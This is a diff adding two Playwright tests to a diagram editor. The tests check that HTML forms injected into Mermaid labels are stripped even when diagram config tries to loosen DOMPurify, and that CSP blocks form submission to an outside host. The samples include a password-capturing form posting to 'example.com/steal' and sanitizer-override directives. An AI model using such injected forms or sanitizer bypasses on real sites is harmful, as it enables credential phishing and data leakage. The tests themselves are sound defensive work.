@@ -665,6 +665,40 @@ test('「共有リンクをコピー」したリンクを別の利用者が開�
   await other.close();
 });
 
+test('図のラベルに書いたフォーム・入力欄は描かない（図の側の設定で消毒を変えても）', async ({ page }) => {
+  await openApp(page);
+  const form = "<form action='https://example.com/steal'><input name=pw type=password><button>送信</button><textarea></textarea>本文</form>";
+  const cases = [
+    `flowchart LR\n  A["${form}"] --> B`,
+    `%%{init: {"dompurifyConfig": {"FORBID_TAGS": {}}}}%%\nflowchart LR\n  A["${form}"] --> B`,
+    `---\nconfig:\n  dompurifyConfig:\n    FORBID_TAGS: x\n---\nflowchart LR\n  A["${form}"] --> B`,
+    `sequenceDiagram\n  A->>B: hi\n  Note over A: ${form}`,
+  ];
+  for (const text of cases) {
+    await setEditorText(page, text);
+    await expect(page.locator('.diagram-canvas svg')).toContainText('本文');
+    await expect(page.locator('.diagram-canvas svg').locator('form, input, button, textarea')).toHaveCount(0);
+  }
+});
+
+test('CSP でフォームの外部への送信を止める（図の内容を外に出さない）', async ({ page }) => {
+  await openApp(page);
+  const sent: string[] = [];
+  await page.route('https://example.com/**', (r) => {
+    sent.push(r.request().url());
+    return r.fulfill({ body: '' });
+  });
+  const refused = page.waitForEvent('console', (m) => m.text().includes('form-action'));
+  await page.evaluate(() => {
+    const f = document.createElement('form');
+    f.action = 'https://example.com/steal';
+    document.body.append(f);
+    f.requestSubmit();
+  });
+  await refused;
+  expect(sent).toEqual([]);
+});
+
 test('アプリとして .mmd を開いたとき（launchQueue）、そのファイルを図として開く', async ({ page }) => {
   // OS の関連付けは試せないので、ページを読み込む前に launchQueue の代わりを置き、受け取る関数にファイルを渡す
   await page.addInitScript(() => {
